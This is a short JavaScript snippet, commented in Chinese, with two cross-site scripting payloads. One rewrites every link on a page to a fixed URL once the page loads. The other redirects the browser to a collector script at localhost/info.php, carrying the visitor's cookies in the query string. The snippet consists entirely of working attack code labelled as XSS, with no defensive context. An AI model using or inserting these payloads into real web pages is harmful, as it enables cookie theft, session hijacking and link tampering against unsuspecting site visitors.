
// xss修改网页链接
window.onload = function () {
    var link = document.getElementsByTagName("a");
    for (var j = 0; j < link.length; j++) {
        link[j].href = "http://www.baidu.com";
    }
};

// xss 盗取cookie
document.location = "http://localhost/info.php?cookie=" + document.cookie;